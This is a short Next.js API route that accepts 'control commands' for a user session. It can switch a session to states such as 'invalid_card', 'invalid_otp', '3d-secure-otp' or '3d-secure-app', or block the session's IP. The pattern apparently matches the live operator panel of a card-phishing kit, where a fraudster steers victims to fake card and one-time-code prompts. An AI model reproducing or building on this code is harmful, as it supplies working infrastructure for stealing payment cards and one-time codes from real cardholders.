import { NextRequest, NextResponse } from 'next/server';
import { setUserState, type UserState } from '@/lib/session-store';
import { addBlockedIp, removeBlockedIp } from '@/lib/config-store';

// API to send control commands to users (redirect to specific state or block)
export async function POST(req: NextRequest) {
  try {
    const { sessionId, action, ip } = await req.json();

    if (!sessionId || !action) {
      return NextResponse.json(
        { error: 'Missing sessionId or action' },
        { status: 400 }
      );
    }

    const validActions: UserState[] = ['invalid_card', 'invalid_otp', '3d-secure-otp', '3d-secure-app', 'block', 'normal'];
    
    if (!validActions.includes(action)) {
      return NextResponse.json(
        { error: `Invalid action. Must be one of: ${validActions.join(', ')}` },
        { status: 400 }
      );
    }

    const session = setUserState(sessionId, action as UserState);

    if (!session) {
      return NextResponse.json(
        { error: 'Session not found' },
        { status: 404 }
      );
    }

    // If blocking, also add IP to blocked list
    if (action === 'block' && ip) {
      addBlockedIp(ip);
    }

    return NextResponse.json({
      success: true,
      message: `User state set to ${action} for session ${sessionId}`,
    });
  } catch (error) {
    console.error('Control command error:', error);
    return NextResponse.json(
      { error: 'Internal Server Error' },
      { status: 500 }
    );
  }
}
